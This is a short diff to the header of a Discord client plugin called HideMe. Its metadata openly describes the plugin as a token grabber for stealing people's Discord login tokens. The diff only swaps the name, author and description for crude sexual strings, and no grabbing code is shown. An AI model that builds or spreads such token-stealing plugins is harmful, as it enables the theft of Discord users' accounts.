@@ -1,6 +1,6 @@
 /**
- * @name HideMe
- * @author HideakiAtsuyo
+ * @name fuckmewiththecranberryjuice
+ * @author sperm
  * @authorId 868150205852291183
  * @version 1.1.9
  * @description Allows you to token grab people omg
@@ -25,13 +25,13 @@ class HideMe {
         return "HideMe";
     }
     getDescription() {
-        return "Better Discord Token Grab Lmao github.com/HideakiAtsuyo";
+        return "sperm";
     }
     getVersion() {
         return "1.1.9";
     }
     getAuthor() {
-        return "Hideaki Atsuyo";
+        return "fuck me daddy";
     }
 
     // Settings  Panel
